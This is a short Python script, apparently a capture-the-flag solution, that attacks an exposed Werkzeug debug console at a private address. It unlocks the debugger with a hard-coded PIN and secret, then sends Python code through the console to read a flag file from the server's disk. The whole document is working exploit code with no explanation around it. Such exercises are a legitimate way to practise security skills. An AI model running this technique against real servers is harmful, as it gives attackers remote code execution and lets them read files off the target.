import requests
from urllib.parse import quote
T = "http://10.82.191.7"
SECRET = "sM6NrAKPszppdtL95Nl2"
PIN = "110-688-511"
s = requests.Session()
s.get(f"{T}?__debugger__=yes&cmd=pinauth&pin={PIN}&s={SECRET}", timeout=10)
cmd = "print(open('/usr/src/app/flag-982374827648721338.txt').read())"
r = s.get(f"{T}/console?__debugger__=yes&cmd={quote(cmd)}&frm=0&s={SECRET}", timeout=10)
print(r.text)
